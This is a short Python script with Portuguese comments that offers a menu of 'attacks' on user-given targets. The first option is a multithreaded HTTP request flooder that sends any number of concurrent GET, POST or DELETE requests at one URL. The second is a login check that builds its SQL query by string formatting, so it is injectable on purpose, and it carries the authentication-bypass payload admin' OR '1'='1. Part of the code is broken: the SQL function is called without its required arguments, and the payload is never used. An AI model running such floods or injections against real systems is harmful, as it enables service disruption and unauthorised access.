import requests
import concurrent.futures
import logging
import sqlite3

# Configuração do logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def request(method, url, headers, params):
    try:
        # Escolhe o tipo de solicitação que deseja
        if method == "GET":
            resposta = requests.get(url, headers=headers, params=params)
        elif method == "POST":
            resposta = requests.post(url, headers=headers, json=params)
        elif method == "DELETE":
            resposta = requests.delete(url, headers=headers, params=params)
        else:
            logging.error("Escolha GET, POST ou DELETE.")
            return
        
        # Verifica se deu certo
        if resposta.status_code == 200:
            print(f"Solicitação bem-sucedida!\nCabeçalhos: {resposta.headers}")
        else:
            print(f"A solicitação ({method}) para {url} falhou, o erro foi um: {resposta.status_code}\nResposta: {resposta.text}")
    except requests.RequestException as e:
        print(f"Erro ao fazer a solicitação HTTP ({method}) para {url}: {str(e)}")

def request_attack():
    url = input("Informe a URL: ")
    try:
        num_solicitations = int(input("Informe o número de solicitações: "))
    except ValueError:
        logging.error("Número de solicitações inválido. Deve ser um inteiro.")
        return
    
    # Pede ao usuário para escolher o método HTTP
    method = input("Escolha o método HTTP (GET, POST ou DELETE): ").upper()
    
    # Verifica se o método escolhido é válido
    if method not in ["GET", "POST", "DELETE"]:
        logging.error("Método inválido. Escolha GET, POST ou DELETE.")
        return
    
    # Pede ao usuário para editar os cabeçalhos
    headers = {}
    while True:
        header_name = input("Informe o nome do cabeçalho (ou deixe em branco para parar): ")
        if not header_name:
            break
        header_value = input(f"Informe o valor para '{header_name}': ")
        headers[header_name] = header_value
    
    # Pede ao usuário para editar os parâmetros
    params = {}
    while True:
        param_name = input("Informe o nome do parâmetro (ou deixe em branco para parar): ")
        if not param_name:
            break
        param_value = input(f"Informe o valor para '{param_name}': ")
        params[param_name] = param_value
    
    # Cria uma lista contendo várias cópias da mesma URL
    urls = [url] * num_solicitations
    
    # Usa a função ThreadPoolExecutor para enviar solicitações ao mesmo tempo
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(32, num_solicitations)) as executor:
        executor.map(lambda u: request(method, u, headers=headers, params=params), urls)

def sql(username, password):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    # Consulta se há a vulnerabilidade
    query = "SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password)

    # Execução da consulta
    cursor.execute(query)

    # Verificação do resultado da consulta
    user = cursor.fetchone()
    if user:
        print("Login bem-sucedido!")
    else:
        print("Usuário ou senha incorretos.")

    conn.close()

    # Exemplo de injeção de SQL
    username = "admin' OR '1'='1"
    password = "password"

    # Tentativa de login com os dados injetados

def menu():
    try:
        decisao = int(input("Escolha um ataque:\n1. HTTP Attack\n2. SQL Injection\n\n>> "))
    except ValueError:
        logging.error("Número de solicitações inválido. Deve ser um inteiro.")
        return
    
    if decisao == 1: 
        request_attack()
    elif decisao == 2: 
        sql()
    else: 
        print('Número Inválido.') 
        menu()

menu()